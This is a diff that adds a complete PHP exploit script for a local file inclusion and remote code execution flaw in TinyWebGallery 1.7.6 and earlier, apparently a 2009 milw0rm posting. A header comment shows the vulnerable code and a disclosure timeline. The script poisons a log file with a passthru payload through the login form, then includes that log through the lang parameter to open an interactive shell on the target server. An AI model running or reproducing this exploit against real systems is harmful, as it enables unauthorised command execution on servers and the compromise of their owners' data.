@@ -1,0 +1,133 @@
+<?php
+
+/*
+	-----------------------------------------------------------
+	TinyWebGallery <= 1.7.6 LFI / Remote Code Execution Exploit
+	-----------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.tinywebgallery.com/
+	details..: this vulnerability drift from QuiXplorer (http://quixplorer.sourceforge.net/)
+
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+
+	[-] vulnerable code in /admin/_include/init.php
+
+	110.	// Get Language
+	111.	if (isset($GLOBALS['__GET']["lang"]))  $GLOBALS["lang"] = $GLOBALS["language"] = $_SESSION["admin_lang"] =  $GLOBALS['__GET']["lang"];
+	112.	elseif (isset($GLOBALS['__POST']["lang"])) $GLOBALS["lang"] = $GLOBALS["language"] = $_SESSION["admin_lang"] =  $GLOBALS['__POST']["lang"];
+	113.	else if (isset($_SESSION["admin_lang"])) $GLOBALS["lang"] = $GLOBALS["language"] = $_SESSION["admin_lang"];  
+	114.	else $GLOBALS["language"] = $GLOBALS["default_language"];
+	115.	
+			[...]
+	138.	
+	139.	// ------------------------------------------------------------------------------
+	140.	// Necessary files
+	141.	require _QUIXPLORER_PATH . "/_config/conf.php";
+	142.	
+	143.	if (file_exists(_QUIXPLORER_PATH . "/_lang/" . $GLOBALS["language"] . ".php"))
+	144.	    require _QUIXPLORER_PATH . "/_lang/" . $GLOBALS["language"] . ".php";
+	145.	else if (file_exists(_QUIXPLORER_PATH . "/_lang/" . $GLOBALS["default_language"] . ".php"))
+	146.	    require _QUIXPLORER_PATH . "/_lang/" . $GLOBALS["default_language"] . ".php";
+	147.	else
+	148.	    require _QUIXPLORER_PATH . "/_lang/en.php";
+
+	An attacker could be able to include arbitrary local files through the require function at line 144, due to
+	$_GET['lang'] parameter isn't properly sanitised. Successful exploitation requires magic_quotes_gpc = off
+
+	[-] Disclosure timeline:
+		
+	[14/04/2009] - Bug discovered
+	[25/04/2009] - Vendor contacted
+	[26/04/2009] - Vendor replied
+	[26/04/2009] - Fix released: http://www.tinywebgallery.com/forum/viewtopic.php?t=1653
+	[08/05/2009] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
+	  die("\nsocket_create(): " . socket_strerror($s) . "\n");
+
+	if (socket_connect($s, $host, 80) == false)
+	  die("\nsocket_connect(): " . socket_strerror(socket_last_error()) . "\n");
+
+	socket_write($s, $packet, strlen($packet));
+	while ($m = socket_read($s, 2048)) $response .= $m;
+
+	socket_close($s);
+	return $response;
+}
+
+function check_target()
+{
+	global $host, $path;
+
+	$packet  = "GET {$path}info.php?showphpinfo=true HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+
+	preg_match('/magic_quotes_gpc<\/td><td class="v">(.*)<\/td><td/', http_send($host, $packet), $match);
+
+	if ($match[1] != "Off") die("\n[-] Exploit failed...magic_quotes_gpc = on\n");
+}
+
+function inject_code()
+{
+	global $host, $path;
+
+	$code	 = "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${die} ?>";
+	$payload = "p_user={$code}&p_pass=";
+
+	$packet  = "POST {$path}admin/index.php?action=login HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Content-Length: ".strlen($payload)."\r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	$packet .= $payload;
+
+	http_send($host, $packet);
+}
+
+print "\n+---------------------------------------------------------------------+";
+print "\n| TinyWebGallery <= 1.7.6 LFI / Remote Code Execution Exploit by EgiX |";
+print "\n+---------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......: php $argv[0] host path\n";
+	print "\nExample....: php $argv[0] localhost /";
+	print "\nExample....: php $argv[0] localhost /twg/\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+check_target();
+inject_code();
+
+$packet  = "GET {$path}admin/index.php?lang=../../counter/_twg.log%%00 HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while (1)
+{
+	print "\ntwg-shell# ";
+	if (($cmd = trim(fgets(STDIN))) == "exit") break;
+	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+	preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed...\n");
+}
+
+?>
+
+# milw0rm.com [2009-05-08]
